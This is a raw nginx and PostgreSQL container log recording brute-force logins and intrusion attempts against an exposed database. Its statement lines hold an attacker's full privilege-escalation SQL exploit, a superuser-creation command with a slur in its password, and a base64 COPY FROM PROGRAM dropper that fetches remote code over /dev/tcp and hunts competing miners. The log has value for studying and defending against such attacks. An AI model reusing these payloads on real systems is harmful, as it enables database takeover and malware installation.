nginx-1  | 176.65.139.66 - - [21/Jun/2026:08:27:00 +0000] "GET / HTTP/1.0" 302 0 "-" "Shodan-Pull/1.0"
db-1     | 2026-06-20 18:47:47.274 UTC [807] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.005 s, sync=0.004 s, total=0.024 s; sync files=2, longest=0.002 s, average=0.002 s; distance=0 kB, estimate=0 kB; lsn=0/1BA00F8, redo lsn=0/1BA00F8
db-1     | 2026-06-20 18:47:47.280 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-20 18:48:38.708 UTC [812] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 18:48:38.708 UTC [812] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:50:11.397 UTC [813] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 18:50:11.397 UTC [813] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:50:47.288 UTC [814] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 18:50:47.288 UTC [814] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:50:49.594 UTC [815] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 18:50:49.594 UTC [815] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:50:55.029 UTC [816] ERROR:  role "wog" already exists
db-1     | 2026-06-20 18:50:55.029 UTC [816] STATEMENT:  CREATE USER wog WITH SUPERUSER PASSWORD 'killallwogs123132';
db-1     | 2026-06-20 18:50:55.856 UTC [816] ERROR:  syntax error at or near "(" at character 50
db-1     | 2026-06-20 18:50:55.856 UTC [816] STATEMENT:  GRANT ALL PRIVILEGES ON DATABASE current_database() TO CURRENT_USER;
db-1     | 2026-06-20 18:50:56.844 UTC [816] ERROR:  syntax error at or near "CONNECT" at character 54
db-1     | 2026-06-20 18:50:56.844 UTC [816] STATEMENT:  CREATE ROLE r0 LOGIN ;
db-1     |      CREATE DATABASE rdb OWNER r0;
db-1     |      CONNECT rdb r0;
db-1     |
db-1     |      CREATE FUNCTION pwn() RETURNS trigger AS $$
db-1     |      BEGIN
db-1     |          IF current_setting('is_superuser') THEN
db-1     |              RAISE WARNING '-- user % --', current_user;
db-1     |              ALTER USER r0 SUPERUSER;
db-1     |          END IF;
db-1     |          RETURN NEW;
db-1     |      END $$ LANGUAGE plpgsql;
db-1     |
db-1     |      CREATE TABLE t1(i INTEGER);
db-1     |      CREATE CONSTRAINT TRIGGER trig
db-1     |          AFTER INSERT ON t1
db-1     |          INITIALLY DEFERRED
db-1     |          FOR EACH ROW EXECUTE PROCEDURE pwn();
db-1     |
db-1     |      CREATE FUNCTION get_target() RETURNS TEXT AS $$
db-1     |          SELECT format('%I.%I',
db-1     |            pg_my_temp_schema()::regnamespace,
db-1     |            'pg_temp_' || 'mv'::text::regclass::oid
db-1     |          );
db-1     |      $$ LANGUAGE SQL STABLE ;
db-1     |
db-1     |      CREATE TYPE etyp AS ENUM ( 'e' );
db-1     |      CREATE FUNCTION wrap_insert(INTEGER) RETURNS INTEGER LANGUAGE sql AS
db-1     |          $$ INSERT INTO t1 VALUES ($1) RETURNING $1; $$ ;
db-1     |      CREATE FUNCTION evil(etyp) RETURNS INTEGER LANGUAGE sql AS
db-1     |          $$ SELECT wrap_insert(1); $$ IMMUTABLE ;
db-1     |      CREATE CAST (etyp AS INTEGER) WITH FUNCTION evil(etyp) AS IMPLICIT ;
db-1     |
db-1     |      CREATE FUNCTION swap() RETURNS INTEGER AS $$
db-1     |      DECLARE
db-1     |          target TEXT := get_target();
db-1     |      BEGIN
db-1     |          IF to_regclass(target) IS NOT NULL THEN
db-1     |            EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
db-1     |            EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);
db-1     |            EXECUTE format('ALTER TABLE %s RENAME COLUMN x TO e', target);
db-1     |          END IF;
db-1     |          RETURN 1;
db-1     |      END
db-1     |      $$ LANGUAGE plpgsql;
db-1     |
db-1     |      CREATE MATERIALIZED VIEW mv AS SELECT swap() AS i, 'e'::etyp as e ;
db-1     |      CREATE UNIQUE INDEX ix_mv_i ON mv (i);
db-1     |
db-1     |      CONNECT rdb postgres;
db-1     |      REFRESH MATERIALIZED VIEW CONCURRENTLY mv;
db-1     | 2026-06-20 18:50:57.716 UTC [816] ERROR:  syntax error at or near "CONNECT" at character 54
db-1     | 2026-06-20 18:50:57.716 UTC [816] STATEMENT:  CREATE ROLE r0 LOGIN ;
db-1     |      CREATE DATABASE rdb OWNER r0;
db-1     |      CONNECT rdb r0;
db-1     |
db-1     |      CREATE FUNCTION pwn() RETURNS trigger AS $$
db-1     |      BEGIN
db-1     |          IF current_setting('is_superuser') THEN
db-1     |              RAISE WARNING '-- user % --', current_user;
db-1     |              ALTER USER r0 SUPERUSER;
db-1     |          END IF;
db-1     |          DROP VIEW IF EXISTS remove_later;
db-1     |          RETURN NEW;
db-1     |      END $$ LANGUAGE plpgsql;
db-1     |
db-1     |      CREATE TABLE t1(i INTEGER);
db-1     |      CREATE CONSTRAINT TRIGGER trig
db-1     |          AFTER INSERT ON t1
db-1     |          INITIALLY DEFERRED
db-1     |          FOR EACH ROW EXECUTE PROCEDURE pwn();
db-1     |
db-1     |      CREATE FUNCTION get_target() RETURNS TEXT AS $$
db-1     |          SELECT format('%I.%I',
db-1     |            pg_my_temp_schema()::regnamespace,
db-1     |            'pg_temp_' || 'mv'::text::regclass::oid
db-1     |          );
db-1     |      $$ LANGUAGE SQL STABLE ;
db-1     |
db-1     |      CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
db-1     |      DECLARE
db-1     |          target TEXT := get_target();
db-1     |      BEGIN
db-1     |          IF to_regclass(target) IS NOT NULL THEN
db-1     |              EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
db-1     |              EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
db-1     |          END IF;
db-1     |          RETURN;
db-1     |      END $$ LANGUAGE plpgsql;
db-1     |
db-1     |      CREATE FUNCTION attack() RETURNS INTEGER AS $$
db-1     |      DECLARE
db-1     |        target TEXT := get_target();
db-1     |      BEGIN
db-1     |          BEGIN
db-1     |              INSERT INTO t1 VALUES (1);
db-1     |              EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
db-1     |              EXECUTE format('CREATE TEMP TABLE %s()', target);
db-1     |          EXCEPTION WHEN OTHERS THEN -- do nothing
db-1     |          END;
db-1     |          RETURN 2;
db-1     |      END $$ LANGUAGE plpgsql;
db-1     |
db-1     |      CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
db-1     |      CREATE UNIQUE INDEX ix_mv_i ON mv (i);
db-1     |
db-1     |      CONNECT rdb postgres;
db-1     |      REFRESH MATERIALIZED VIEW CONCURRENTLY mv;
db-1     | 2026-06-20 18:50:59.014 UTC [1] LOG:  server process (PID 816) was terminated by signal 9: Killed
db-1     | 2026-06-20 18:50:59.014 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-20 18:50:59.014 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-20 18:50:59.018 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-20 18:50:59.056 UTC [818] LOG:  database system was interrupted; last known up at 2026-06-20 18:47:47 UTC
db-1     | 2026-06-20 18:50:59.129 UTC [818] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-20 18:50:59.133 UTC [818] LOG:  redo starts at 0/1BA0170
db-1     | 2026-06-20 18:50:59.134 UTC [818] LOG:  invalid record length at 0/1BA1240: expected at least 24, got 0
db-1     | 2026-06-20 18:50:59.135 UTC [818] LOG:  redo done at 0/1BA11E8 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-20 18:50:59.141 UTC [819] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-20 18:50:59.163 UTC [819] LOG:  checkpoint complete: wrote 9 buffers (0.1%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.005 s, sync=0.006 s, total=0.025 s; sync files=8, longest=0.003 s, average=0.001 s; distance=4 kB, estimate=4 kB; lsn=0/1BA1240, redo lsn=0/1BA1240
db-1     | 2026-06-20 18:50:59.170 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-20 18:51:43.344 UTC [824] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 18:51:43.344 UTC [824] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:53:15.976 UTC [825] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 18:53:15.976 UTC [825] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:54:40.585 UTC [826] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 18:54:40.585 UTC [826] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:54:44.768 UTC [827] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 18:54:44.768 UTC [827] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:54:48.465 UTC [828] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 18:54:48.465 UTC [828] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:55:20.145 UTC [829] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 18:55:20.145 UTC [829] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:55:34.545 UTC [830] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 18:55:34.545 UTC [830] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:55:54.046 UTC [1] LOG:  server process (PID 831) was terminated by signal 9: Killed
db-1     | 2026-06-20 18:55:54.046 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-20 18:55:54.046 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-20 18:55:54.050 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-20 18:55:54.096 UTC [836] LOG:  database system was interrupted; last known up at 2026-06-20 18:50:59 UTC
db-1     | 2026-06-20 18:55:54.181 UTC [836] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-20 18:55:54.187 UTC [836] LOG:  redo starts at 0/1BA12B8
db-1     | 2026-06-20 18:55:54.189 UTC [836] LOG:  invalid magic number 0000 in WAL segment 000000010000000000000001, LSN 0/1BA4000, offset 12206080
db-1     | 2026-06-20 18:55:54.189 UTC [836] LOG:  redo done at 0/1BA2868 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-20 18:55:54.198 UTC [837] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-20 18:55:54.223 UTC [837] LOG:  checkpoint complete: wrote 5 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.006 s, sync=0.006 s, total=0.028 s; sync files=5, longest=0.004 s, average=0.002 s; distance=11 kB, estimate=11 kB; lsn=0/1BA4048, redo lsn=0/1BA4048
db-1     | 2026-06-20 18:55:54.228 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-20 18:56:20.721 UTC [842] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 18:56:20.721 UTC [842] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:57:53.826 UTC [843] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 18:57:53.826 UTC [843] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:59:25.752 UTC [844] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 18:59:25.752 UTC [844] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:00:58.879 UTC [845] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 19:00:58.879 UTC [845] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:02:28.889 UTC [846] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 19:02:28.889 UTC [846] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:02:32.518 UTC [847] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 19:02:32.518 UTC [847] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:02:43.925 UTC [848] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 19:02:43.925 UTC [848] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:03:03.823 UTC [1] LOG:  server process (PID 849) was terminated by signal 9: Killed
db-1     | 2026-06-20 19:03:03.823 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-20 19:03:03.823 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-20 19:03:03.827 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-20 19:03:03.861 UTC [855] LOG:  database system was interrupted; last known up at 2026-06-20 18:55:54 UTC
db-1     | 2026-06-20 19:03:03.940 UTC [855] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-20 19:03:03.945 UTC [855] LOG:  redo starts at 0/1BA40C0
db-1     | 2026-06-20 19:03:03.946 UTC [855] LOG:  invalid record length at 0/1BA4150: expected at least 24, got 0
db-1     | 2026-06-20 19:03:03.946 UTC [855] LOG:  redo done at 0/1BA4118 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-20 19:03:03.953 UTC [856] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-20 19:03:03.986 UTC [856] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.007 s, sync=0.004 s, total=0.037 s; sync files=2, longest=0.002 s, average=0.002 s; distance=0 kB, estimate=0 kB; lsn=0/1BA4150, redo lsn=0/1BA4150
db-1     | 2026-06-20 19:03:03.996 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-20 19:04:05.083 UTC [861] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 19:04:05.083 UTC [861] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:05:37.392 UTC [862] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 19:05:37.392 UTC [862] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:07:09.333 UTC [864] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 19:07:09.333 UTC [864] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:08:04.177 UTC [865] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 19:08:04.177 UTC [865] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:08:41.696 UTC [867] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 19:08:41.696 UTC [867] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:09:06.390 UTC [866] FATAL:  canceling authentication due to timeout
db-1     | 2026-06-20 19:10:14.198 UTC [869] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 19:10:14.198 UTC [869] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:10:48.726 UTC [870] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 19:10:48.726 UTC [870] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:10:59.810 UTC [871] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 19:10:59.810 UTC [871] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:11:45.371 UTC [872] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 19:11:45.371 UTC [872] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:13:17.318 UTC [875] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 19:13:17.318 UTC [875] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:14:48.833 UTC [877] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 19:14:48.833 UTC [877] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:16:20.370 UTC [880] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 19:16:20.370 UTC [880] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:17:45.490 UTC [882] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 19:17:45.490 UTC [882] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:17:52.446 UTC [884] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 19:17:52.446 UTC [884] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 19:18:01.045 UTC [883] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 19:18:01.045 UTC [883] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
